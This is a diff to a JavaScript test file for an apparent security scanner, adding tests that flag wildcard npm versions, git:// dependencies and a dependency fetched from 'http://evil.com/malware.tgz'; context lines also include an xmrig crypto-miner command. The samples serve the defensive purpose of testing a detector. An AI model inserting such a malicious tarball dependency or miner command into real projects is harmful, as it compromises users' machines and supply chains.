@@ -67,6 +67,28 @@ describe("scanFileContent", () => {
     expect(findRule(findings, "suspicious-npm-postinstall")).toBe(true);
   });
 
+  it("detects wildcard or HTTP tarball dependencies in package.json", () => {
+    const content1 = JSON.stringify({
+      dependencies: { lodash: "*" },
+    });
+    const findings1 = scanFileContent(content1, "package.json");
+    expect(findRule(findings1, "dependency-wildcard-version")).toBe(true);
+
+    const content2 = JSON.stringify({
+      dependencies: { badpkg: "http://evil.com/malware.tgz" },
+    });
+    const findings2 = scanFileContent(content2, "package.json");
+    expect(findRule(findings2, "dependency-wildcard-version")).toBe(true);
+  });
+
+  it("detects insecure git protocol in package.json dependencies", () => {
+    const content = JSON.stringify({
+      dependencies: { react: "git://github.com/facebook/react.git" },
+    });
+    const findings = scanFileContent(content, "package.json");
+    expect(findRule(findings, "dependency-insecure-git-protocol")).toBe(true);
+  });
+
   it("detects crypto miner keywords", () => {
     const findings = scanFileContent("xmrig --url stratum+tcp://pool.minero.cc", "miner.sh");
     expect(findRule(findings, "crypto-miner-keywords")).toBe(true);
